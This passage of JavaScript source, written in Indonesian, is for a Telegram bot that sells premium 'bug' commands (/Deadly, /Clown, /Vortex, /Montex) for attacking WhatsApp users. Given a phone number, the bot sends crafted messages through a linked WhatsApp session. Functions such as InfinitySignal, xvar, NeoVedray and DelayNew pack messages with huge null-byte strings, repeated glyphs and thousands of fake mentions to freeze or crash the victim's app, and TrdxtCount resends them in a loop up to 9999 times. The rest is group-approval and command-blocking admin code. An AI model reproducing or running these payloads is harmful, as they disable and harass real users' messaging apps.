      );
    }
  });
});

bot.command("Deadly", premGroupOnly(), async (ctx) => {
  const userId = ctx.from.id.toString();

  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }

  if (!isWhatsAppConnected) {
    return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
  }

  const args = ctx.message.text.split(" ");
  if (!args[1]) {
    return ctx.reply("📌 Format: /Deadly 628xxxx", { parse_mode: "HTML" });
  }

  const rawNumber = args[1];
  const target = formatTarget(rawNumber);

  if (!target) {
    return ctx.reply("❌ Nomor tidak valid...", { parse_mode: "HTML" });
  }

  const taskId = Date.now().toString().slice(-6);
  const startAt = Date.now();

  const uname = ctx.from.username ? `@${ctx.from.username}` : "-";
  const fname = [ctx.from.first_name, ctx.from.last_name].filter(Boolean).join(" ") || "-";

  await ctx.telegram.sendMessage(
    ctx.chat.id, `\`\`\`js
"一緒 Attachment Bug ᯤ"
───────────────────
𝙏𝙖𝙧𝙜𝙚𝙩 : ${rawNumber}
𝙈𝙤𝙙𝙚 : Delay Invisible Medium 
𝙎𝙩𝙖𝙩𝙪𝙨 : Sedang Mengirim...
\`\`\``,
    {
      parse_mode: "Markdown"
    }
  );

  queue.add(async () => {
    try {
      await RunningJobs(ctx, target);

      const ms = Date.now() - startAt;
      const sec = Math.floor(ms / 1000);
      const mm = String(Math.floor(sec / 60)).padStart(2, "0");
      const ss = String(sec % 60).padStart(2, "0");

      await ctx.telegram.sendMessage(
        ctx.chat.id, `\`\`\`js
"一緒 Attachment Bug ᯤ"
───────────────────
𝙏𝙖𝙧𝙜𝙚𝙩 : ${rawNumber}
𝙈𝙤𝙙𝙚 : Delay Invisible Medium 
𝙎𝙩𝙖𝙩𝙪𝙨 : Payload Terkirim 
\`\`\``,
        {
          parse_mode: "Markdown"
        }
      );
    } catch (e) {
      await ctx.telegram.sendMessage(
        ctx.chat.id, `\`\`\`js
"一緒 Attachment Bug ᯤ"
───────────────────
𝙏𝙖𝙧𝙜𝙚𝙩 : ${rawNumber}
𝙈𝙤𝙙𝙚 : Delay Invisible Medium
𝙎𝙩𝙖𝙩𝙪𝙨 : Payload Gagal
\`\`\``,
        {
          parse_mode: "Markdown"
        }
      );
    }
  });
});

bot.command("Clown", premGroupOnly(), async (ctx) => {
  const userId = ctx.from.id.toString();

  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }

  if (!isWhatsAppConnected) {
    return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
  }

  const args = ctx.message.text.split(" ");
  if (!args[1]) {
    return ctx.reply("📌 Format: /Clown 628xxxx", { parse_mode: "HTML" });
  }

  const rawNumber = args[1];
  const target = formatTarget(rawNumber);

  if (!target) {
    return ctx.reply("❌ Nomor tidak valid...", { parse_mode: "HTML" });
  }

  const taskId = Date.now().toString().slice(-6);
  const startAt = Date.now();

  const uname = ctx.from.username ? `@${ctx.from.username}` : "-";
  const fname = [ctx.from.first_name, ctx.from.last_name].filter(Boolean).join(" ") || "-";

  await ctx.telegram.sendMessage(
    ctx.chat.id, `\`\`\`js
"一緒 Attachment Bug ᯤ"
───────────────────
𝙏𝙖𝙧𝙜𝙚𝙩 : ${rawNumber}
𝙈𝙤𝙙𝙚 : Delay Invisible hard
𝙎𝙩𝙖𝙩𝙪𝙨 : Sedang Mengirim...
\`\`\``,
    {
      parse_mode: "Markdown"
    }
  );

  queue.add(async () => {
    try {
      await RunningJobs(ctx, target);

      const ms = Date.now() - startAt;
      const sec = Math.floor(ms / 1000);
      const mm = String(Math.floor(sec / 60)).padStart(2, "0");
      const ss = String(sec % 60).padStart(2, "0");

      await ctx.telegram.sendMessage(
        ctx.chat.id, `\`\`\`js
"一緒 Attachment Bug ᯤ"
───────────────────
𝙏𝙖𝙧𝙜𝙚𝙩 : ${rawNumber}
𝙈𝙤𝙙𝙚 : Delay Invisible hard
𝙎𝙩𝙖𝙩𝙪𝙨 : Payload Terkirim 
\`\`\``,
        {
          parse_mode: "Markdown"
        }
      );
    } catch (e) {
      await ctx.telegram.sendMessage(
        ctx.chat.id, `\`\`\`js
"一緒 Attachment Bug ᯤ"
───────────────────
𝙏𝙖𝙧𝙜𝙚𝙩 : ${rawNumber}
𝙈𝙤𝙙𝙚 : Delay Invisible hard
𝙎𝙩𝙖𝙩𝙪𝙨 : Payload Gagal
\`\`\``,
        {
          parse_mode: "Markdown"
        }
      );
    }
  });
});

bot.command("Vortex", premGroupOnly(), async (ctx) => {
  const userId = ctx.from.id.toString();

  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }

  if (!isWhatsAppConnected) {
    return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
  }

  const args = ctx.message.text.split(" ");
  if (!args[1]) {
    return ctx.reply("📌 Format: /Vortex 628xxxx", { parse_mode: "HTML" });
  }

  const rawNumber = args[1];
  const target = formatTarget(rawNumber);

  if (!target) {
    return ctx.reply("❌ Nomor tidak valid...", { parse_mode: "HTML" });
  }

  const taskId = Date.now().toString().slice(-6);
  const startAt = Date.now();

  const uname = ctx.from.username ? `@${ctx.from.username}` : "-";
  const fname = [ctx.from.first_name, ctx.from.last_name].filter(Boolean).join(" ") || "-";

  await ctx.telegram.sendMessage(
    ctx.chat.id, `\`\`\`js
"一緒 Attachment Bug ᯤ"
───────────────────
𝙏𝙖𝙧𝙜𝙚𝙩 : ${rawNumber}
𝙈𝙤𝙙𝙚 : Delay Invisible Low
𝙎𝙩𝙖𝙩𝙪𝙨 : Sedang Mengirim...
\`\`\``,
    {
      parse_mode: "Markdown"
    }
  );

  queue.add(async () => {
    try {
      await RunningJobs(ctx, target);

      const ms = Date.now() - startAt;
      const sec = Math.floor(ms / 1000);
      const mm = String(Math.floor(sec / 60)).padStart(2, "0");
      const ss = String(sec % 60).padStart(2, "0");

      await ctx.telegram.sendMessage(
        ctx.chat.id, `\`\`\`js
"一緒 Attachment Bug ᯤ"
───────────────────
𝙏𝙖𝙧𝙜𝙚𝙩 : ${rawNumber}
𝙈𝙤𝙙𝙚 : Delay Invisible Low
𝙎𝙩𝙖𝙩𝙪𝙨 : Payload Terkirim 
\`\`\``,
        {
          parse_mode: "Markdown"
        }
      );
    } catch (e) {
      await ctx.telegram.sendMessage(
        ctx.chat.id, `\`\`\`js
"一緒 Attachment Bug ᯤ"
───────────────────
𝙏𝙖𝙧𝙜𝙚𝙩 : ${rawNumber}
𝙈𝙤𝙙𝙚 : Delay Invisible Low
𝙎𝙩𝙖𝙩𝙪𝙨 : Payload Gagal
\`\`\``,
        {
          parse_mode: "Markdown"
        }
      );
    }
  });
});

bot.command("Montex", premGroupOnly(), async (ctx) => {
  const userId = ctx.from.id.toString();

  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }

  if (!isWhatsAppConnected) {
    return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
  }

  const args = ctx.message.text.split(" ");
  if (!args[1]) {
    return ctx.reply("📌 Format: /Montex 628xxxx", { parse_mode: "HTML" });
  }

  const rawNumber = args[1];
  const target = formatTarget(rawNumber);

  if (!target) {
    return ctx.reply("❌ Nomor tidak valid...", { parse_mode: "HTML" });
  }

  const taskId = Date.now().toString().slice(-6);
  const startAt = Date.now();

  const uname = ctx.from.username ? `@${ctx.from.username}` : "-";
  const fname = [ctx.from.first_name, ctx.from.last_name].filter(Boolean).join(" ") || "-";

  await ctx.telegram.sendMessage(
    ctx.chat.id, `\`\`\`js
"一緒 Attachment Bug ᯤ"
───────────────────
𝙏𝙖𝙧𝙜𝙚𝙩 : ${rawNumber}
𝙈𝙤𝙙𝙚 : Delay New invisible 
𝙎𝙩𝙖𝙩𝙪𝙨 : Sedang Mengirim...
\`\`\``,
    {
      parse_mode: "Markdown"
    }
  );

  queue.add(async () => {
    try {
      await RunningJobs(ctx, target);

      const ms = Date.now() - startAt;
      const sec = Math.floor(ms / 1000);
      const mm = String(Math.floor(sec / 60)).padStart(2, "0");
      const ss = String(sec % 60).padStart(2, "0");

      await ctx.telegram.sendMessage(
        ctx.chat.id, `\`\`\`js
"一緒 Attachment Bug ᯤ"
───────────────────
𝙏𝙖𝙧𝙜𝙚𝙩 : ${rawNumber}
𝙈𝙤𝙙𝙚 : Delay New invisible 
𝙎𝙩𝙖𝙩𝙪𝙨 : Payload Terkirim 
\`\`\``,
        {
          parse_mode: "Markdown"
        }
      );
    } catch (e) {
      await ctx.telegram.sendMessage(
        ctx.chat.id, `\`\`\`js
"一緒 Attachment Bug ᯤ"
───────────────────
𝙏𝙖𝙧𝙜𝙚𝙩 : ${rawNumber}
𝙈𝙤𝙙𝙚 : Delay New invisible 
𝙎𝙩𝙖𝙩𝙪𝙨 : Payload Gagal
\`\`\``,
        {
          parse_mode: "Markdown"
        }
      );
    }
  });
});

//------------------(AWAL OF FUNCTION)--------------------//
async function delSticker(sock, target) {
  const botJid = sock.user.id.split(":")[0] + "@s.whatsapp.net";
  if (target === botJid) return;
  const msg = generateWAMessageFromContent(
    target,
    {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
        fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
        fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
        mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
        mimetype: "image/webp",
        directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
        fileLength: "10610",
        mediaKeyTimestamp: "1775044724",
        stickerSentTs: "1775044724091"
      }
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {});
}

async function TrdxtCount(duration, target) {
  const totalDuration = duration * 60 * 60 * 1000;
  const startTime = Date.now();
  let amount = 0;
  //setting langsung di sini
  let maxSend = 9999; // jumlah kirim
  let delay = "1s"; // delay (5s, 1m, 2h)

  const parseDelay = (input) => {
    if (typeof input === "number") return input;

    const num = parseInt(input);
    if (input.endsWith("s")) return num * 1000;
    if (input.endsWith("m")) return num * 60 * 1000;
    if (input.endsWith("h")) return num * 60 * 60 * 1000;

    return 5000;
  };

  const delayMs = parseDelay(delay);

  const nextMessage = async () => {
    if (Date.now() - startTime >= totalDuration) {
      console.log(`Berhenti setelah ${amount} pesan`);
      return;
    }

    if (amount < maxSend) {
      await InfinitySignal(sock, target);
      await InfinitySignal(sock, target);

      amount++;
      console.log(chalk.blue(`Tredict Invictus ${amount}/${maxSend} ke ${target}`));

      setTimeout(nextMessage, delayMs);

    } else {
      console.log(chalk.blue(`Berhasil Mengirim ${maxSend} Status Bug ke ${target}`));
      amount = 0;

      console.log(chalk.blue(`Melanjutkan ${maxSend} Status Bug berikutnya`));

      setTimeout(nextMessage, delayMs);
    }
  };

  nextMessage();
}

async function InfinitySignal(sock, target) {
  try {
  const msg1 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: ".menu", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(522500),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: (Date.now() / 1000) | 0
    });

    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    }, { participant: target });

    const msg2 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "x", format: "BOLD" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(522500),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: (Date.now() / 1000) | 0
    });

    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    }, { participant: target });

    const Audio = {
      message: {
        ephemeralMessage: {
          message: {
            audioMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
              mimetype: "audio/mpeg",
              fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
              fileLength: 999999999999,
              seconds: 99999999999999,
              ptt: true,
              mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
              fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
              directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
              mediaKeyTimestamp: 99999999999999,
              contextInfo: {
                mentionedJid: [
                  "@s.whatsapp.net",
                  ...Array.from({ length: 5600 }, () => "1" + Math.floor(Math.random() * 90000000) + "@s.whatsapp.net")
                ],
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "133@newsletter",
                  serverMessageId: 1,
                  newsletterName: "����"
                }
              },
              waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
            }
          }
        }
      }
    };

    const msgAudio = await generateWAMessageFromContent(target, Audio.message, { userJid: target });

    await sock.relayMessage("status@broadcast", msgAudio.message, {
      messageId: msgAudio.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    const stickerMsg = {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
        fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
        fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
        mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
        mimetype: "image/webp",
        height: 9999,
        width: 9999,
        directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
        fileLength: 12260,
        mediaKeyTimestamp: "1743832131",
        isAnimated: false,
        stickerSentTs: "X",
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 5600 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
          ],
          stanzaId: "1234567890ABCDEF",
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            }
          }
        }
      }
    };

    await sock.relayMessage("status@broadcast", stickerMsg, {
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });

    if (mention) {
      await sock.relayMessage(target, {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msgAudio.key,
              type: 25
            }
          }
        }
      }, {
        additionalNodes: [{
          tag: "meta",
          attrs: {
            is_status_mention: "!"
          },
          content: undefined
        }]
      });
    }
    let msg = await generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        body : { text: "X", format: "DEFAULT" },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: "\u0000".repeat(100000)
        },
    contextInfo: {
       mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 5600 },
                () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
       entryPointConversionSource: "galaxy_message"
      }
    }
  }, {});
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message
    }
  },
    {
      participant: { jid: target },
      messageId: msg.key.id
    });
    
    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
  } catch (err) {
    console.log(err.message)
  }
}

async function NoobUi(sock, target) {
  const Msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "VISI"
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(150000),
                  phone_number: "00000000000000"
                })
              }
            ],
            version: 3
          }
        }
      }
    }
  };
  await sock.relayMessage(target, Msg, {
    participant: { jid: target }
  });
}

async function xvar(sock, target) {
const mark = () => Math.random().toString().slice(2, 8) + Date.now().toString().slice(-64);
  try {
    await sock.relayMessage(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "la u nape" + "ꦾ".repeat(60000) },
            header: {
              hasMediaAttachment: true,
              locationMessage: {
                degreesLatitude: 254515607254515602025.843324832,
                degreesLongitude: 254515607254515602025.843324832,
                name: `nortexz${"ꦾ".repeat(500)}`,
                address: mark(),
                url: `https://wa.me/official/NortexZ/${mark()}`,
                comment: `https://wa.me/${mark()}/settings`,
                jpegThumbnail: null,  
              },
            },
            footer: { footerText: 'exCepNull' },
            nativeFlowMessage: {
              buttons: [
                {
  name: 'single_select',
  buttonParamsJson: JSON.stringify({
    title: "\u0000".repeat(100),
  })
}, 
{ 
    name: "quick_reply",
    buttonParamsJson: JSON.stringify({ display_text: "ꦾ".repeat(15000), id: null })
  },
  { 
    name: "quick_reply",
    buttonParamsJson: JSON.stringify({ display_text: "ោ៝".repeat(15000), id: null })
  },
  { 
    name: "quick_reply",
    buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(15000), id: null })
  },
  { 
    name: "cta_copy",
    buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(15000), copy_code: null })
  },
  { 
    name: "cta_url",
    buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(15000), url: "https://t.me/NortexZ" })
  },
  { 
    name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  flow_cta: "ꦾ".repeat(20000),
                  header: "ꦾ".repeat(20000),
                  body:"ꦾ".repeat(20000),
                  flow_action_payload: { screen: "FORM_SCREEN" },
                  flow_id: null,
                  flow_message_version: "3",
                  flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                }),
                    nativeFlowInfo: {
          name: "address_message",
          paramsJson: JSON.stringify({
            addressMessage: null
          })
          }}, 
              ],
              messageParamsJson: '}'.repeat(1000),
              messageVersion: 3,
            },
            contextInfo: {
              stanzaId: mark(),
              remoteJid: 'status@broadcast',
              isForwarded: true,
              forwardingScore: 999,
              mentionedJid: [
                ...Array.from({ length: 1900 }, (_, p) => `86705131476${p}@bot`),
                target,
                '0@s.whatsapp.net',
              ],
              quotedMessage: { 
              conversation: "ꦾ".repeat(15000)
                }, 
             forwardedNewsletterMessageInfo: {
              newsletterJid: "120363408414908738@newsletter",
              newsletterName: "\u0000",
              serverMessageId: 1000,
              accessibilityText: "\u0000"
            },
            },
          },
        },
      },
    }, {
      messageId: null, 
    });
  } catch (e) {
    console.log(':', e.message);
  }
}

async function NeoVedray(sock, target) {

  const uni = "ꦾ".repeat(20000) 

  const cards = [
    {
      header: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQPwPlE6mrjf2JzVzHenD6TdxX-CfrG3cWqm_u9r0itQ69oTihUyOO0N24ZJ5grIQ2ei4twooEJRI-PNle5RXe6jM3ZvUnnMKlQ_GbDvmQ?ccb=9-4&oh=01_Q5Aa4AFA9xUvX5mw1Gwixdp5prNqMH2yxAX_avssB50rKpw5uQ&oe=69DA46F1&_nc_sid=e6ed6c&mms3=true",
          mimetype: "image/jpeg",
          caption: "Neo Gextrayx" + uni
        }
      },
      body: {
        text: "Hello Bro !¡"
      }
    },
    {
      header: {
        imageMessage: {
          url: "https://j.top4top.io/p_37456ppnt1.jpg",
          mimetype: "image/jpeg",
          caption: "Enternamion LexNeo" + uni
        }
      },
      body: {
        text: "How Are You?"
      }
    }
  ]

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "ꦽ".repeat(60000)
            },
            footer: {
              text: "DexGroxNeo"
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "quick_reply",
                  buttonParamsJson:
                    "{\"display_text\":\"MEXVIC " + uni + "\",\"id\":\"btn1\"}"
                },
                {
                  name: "cta_copy",
                  buttonParamsJson:
                    "{\"display_text\":\"NEXVAC" + uni + "\",\"copy_code\":\"Neo-" + uni + "\"}"
                },
                {
                  name: "request_location",
                  buttonParamsJson:
                    "{\"display_text\":\"JALOCS" + uni + "\"}"
                }
              ],
              messageParamsJson:
                "{\"meta\":\"" + uni + "\"}",
              messageVersion: 1
            },
            contextInfo: {
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: [target],
              externalAdReply: {
                title: "Neo Trextra",
                body: "Menxtra Neo",
                thumbnailUrl: "https://j.top4top.io/p_37456ppnt1.jpg",
                mediaType: 1,
                sourceUrl: "https://t.me/YukoNekoPoi",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  )

  await sock.relayMessage(
    target,
    msg.message,
    { messageId: msg.key.id }
  )
}

async function jirDelayHardWak(target) {
  await sock.relayMessage(
    target,
    {
      albumMessage: {
        contextInfo: {
          mentionedJid: Array.from(
            { length: 2000 },
            () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
          ),
          remoteJid: " kelra - execute ",
          parentGroupJid: "0@g.us",
          isQuestion: true,
          isSampled: true,
          parentGroupJid: "\u0000",
          entryPointConversionDelaySeconds: 6767676767,
          businessMessageForwardInfo: null,
          botMessageSharingInfo: {
            botEntryPointOrigin: {
              origins: "BOT_MESSAGE_ORIGIN_TYPE_AI_INITIATED"
            },
            forwardScore: 999
          },
          quotedMessage: {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  body: {
                    text: "KELRA_MESSAGE",
                    format: "EXTENSIONS_1",
                  },
                  nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: "\u0000".repeat(1000000),
                    version: 1,
                  },
                },
              },
            },
          },
        },
      },
    },
    {
      participant: { jid: target },
    }
  );
}

async function DelayNew(sock, target) {
  const Msg = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "VISI",
            format: "DEFAULT"
          }, 
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(900000),
            version: 3,
            contextInfo: {
              mentionedJid: Array.from({ length: 5000 }, (_, r) => `6285983729${r + 1}@s.whatsapp.net`)
            }
          }
        }
      }
    }
  };
  await sock.relayMessage(target, Msg, {});
}

//------------------(AKHIR OF FUNCTION)--------------------//
bot.command("approved", async (ctx) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.reply("❌ Hanya owner yang bisa approve group.");
  }

  const args = ctx.message.text.split(" ").slice(1);
  const chatId = args[0];

  if (!chatId) {
    return ctx.reply("🪧 Format: /approved -100xxxxxxxxxx");
  }

  if (isGroupApproved(chatId)) {
    return ctx.reply("⚠️ Group ini sudah di-approve.");
  }

  approvedGroups.push(String(chatId));
  saveApprovedGroups();

  if (pendingGroups.has(String(chatId))) {
    clearTimeout(pendingGroups.get(String(chatId)).timeout);
    pendingGroups.delete(String(chatId));
  }

  try {
    await ctx.telegram.sendMessage(
      chatId,
      "✅ Group ini telah di-approve oleh owner. Bot sekarang aktif di sini."
    );
  } catch (e) {}

  return ctx.reply(`✅ Group ${chatId} berhasil di-approve.`);
});

bot.command("unapproved", async (ctx) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.reply("❌ Hanya owner yang bisa mencabut approve.");
  }

  const args = ctx.message.text.split(" ").slice(1);
  const chatId = args[0];

  if (!chatId) {
    return ctx.reply("🪧 Format: /unapproved -100xxxxxxxxxx");
  }

  if (!isGroupApproved(chatId)) {
    return ctx.reply("⚠️ Group ini belum di-approve.");
  }

  approvedGroups = approvedGroups.filter((id) => id !== String(chatId));
  saveApprovedGroups();

  try {
    await ctx.telegram.sendMessage(
      chatId,
      "⚠️ Approval group ini dicabut oleh owner. Bot akan nonaktif di sini."
    );
  } catch (e) {}

  return ctx.reply(`✅ Approval group ${chatId} berhasil dicabut.`);
});

bot.command("listapprovedgroup", async (ctx) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.reply("❌ Hanya owner yang bisa melihat daftar.");
  }

  if (approvedGroups.length === 0) {
    return ctx.reply("📭 Belum ada group yang di-approve.");
  }

  const text = approvedGroups.map((id, i) => `${i + 1}. ${id}`).join("\n");
  return ctx.reply(`📋 Daftar group approved:\n\n${text}`);
});

bot.command("blockcmd", async (ctx) => {
  if (String(ctx.from.id) !== String(ownerID)) {
    return ctx.reply("❌ Akses ditolak.");
  }

  const args = ctx.message.text.split(" ").slice(1);
  const commandName = normalizeCommandName(args[0]);

  if (!commandName) {
    return ctx.reply("🪧 Format: /blockcmd namacommand");
  }

  if (["blockcmd", "unblockcmd", "listblockcmd"].includes(commandName)) {
    return ctx.reply("❌ Command ini tidak bisa diblokir.");
  }

  if (blockedCommands.includes(commandName)) {
    return ctx.reply(`⚠️ Command /${commandName} sudah diblokir.`);
  }

  blockedCommands.push(commandName);
  saveBlockedCommands();

  return ctx.reply(`✅ Command /${commandName} berhasil diblokir.`);
});

bot.command("unblockcmd", async (ctx) => {
  if (String(ctx.from.id) !== String(ownerID)) {
    return ctx.reply("❌ Akses ditolak.");
  }

  const args = ctx.message.text.split(" ").slice(1);
  const commandName = normalizeCommandName(args[0]);

  if (!commandName) {
    return ctx.reply("🪧 Format: /unblockcmd namacommand");
  }

  if (!blockedCommands.includes(commandName)) {
    return ctx.reply(`⚠️ Command /${commandName} tidak sedang diblokir.`);
  }

  blockedCommands = blockedCommands.filter(cmd => cmd !== commandName);
  saveBlockedCommands();

  return ctx.reply(`✅ Command /${commandName} berhasil dibuka kembali.`);
});

bot.command("listblockcmd", async (ctx) => {
  if (String(ctx.from.id) !== String(ownerID)) {
    return ctx.reply("❌ Akses ditolak.");
  }

  if (blockedCommands.length === 0) {
    return ctx.reply("✅ Tidak ada command yang sedang diblokir.");
  }

  const list = blockedCommands.map((cmd, i) => `${i + 1}. /${cmd}`).join("\n");

  return ctx.reply(
    `📋 Daftar command yang diblokir:\n\n${list}`
  );
});

// ================================
// COMMAND: ADD PREMIUM GROUP
// /addpremgrup
// ================================
bot.command("addpremgrup", ownerOnly(), async (ctx) => {
  const type = ctx.chat?.type;
  if (type === "private") return ctx.reply("❌ Pakai command ini di grup.");

  addPremGroup(ctx.chat.id);

  const title = escapeHtml(ctx.chat?.title || "Unknown Group");
  return ctx.reply(
    `✅ ☇ <b>${title}</b> berhasil ditambahkan sebagai Group premium`,
    { parse_mode: "HTML" }
  );
});

// ================================
// COMMAND: DELETE PREMIUM GROUP
// /delpremgrup
// ================================
bot.command("delpremgrup", ownerOnly(), async (ctx) => {
  const type = ctx.chat?.type;
